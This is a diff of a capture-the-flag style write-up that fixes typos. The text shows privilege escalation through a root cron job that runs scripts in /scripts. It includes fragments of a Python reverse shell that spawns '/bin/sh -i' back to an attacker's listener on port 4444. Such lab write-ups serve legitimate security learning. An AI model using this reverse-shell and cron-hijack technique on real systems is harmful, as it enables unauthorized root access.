@@ -81,11 +81,11 @@ Obtain the user permission is quite easy, and it is not difficult to obtain the 
 su -u scrriptmanager bash -i
 ```
 
-Try to enumerate the files. And I find an interesting folder inside `/script`. There are two files test.py and test.txt. Try to display the content of `test.py`.
+Try to enumerate the files. And I find an interesting folder inside `/scripts`. There are two files `test.py` and `test.txt`. Try to display the content of `test.py`.
 
 [![AghxO0.png](https://s2.ax1x.com/2019/04/04/AghxO0.png)](https://imgchr.com/i/AghxO0)
 
-The python script is quite straightforwared. It just write `testing 123!` to the file `test.txt`. And if we see the attributes of `test.txt`, the modified time of the file changes each minute. And the file is owned by root. It seems that `root` will execute the python scripts in `/script` folder each minute. So utilize a python script to reverse the root shell(accordint to the information above, the python version of the target machine is 2.7):
+The python script is quite straightforward. It just writes `testing 123!` to the file `test.txt`. And if we see the attributes of `test.txt`, the modified time of the file changes each minute. And the file is owned by root. It seems that `root` will execute the python scripts in `/scripts` folder each minute. So utilize a python script to reverse the root shell(according to the information above, the python version of the target machine is 2.7):
 
 ```python 
 import socket,subprocess,os;
@@ -97,7 +97,7 @@ os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);
 ```
 
-Set the kali to listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.
+Set the kali listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.
 
 ![AgICRJ.png](https://s2.ax1x.com/2019/04/04/AgICRJ.png)
 
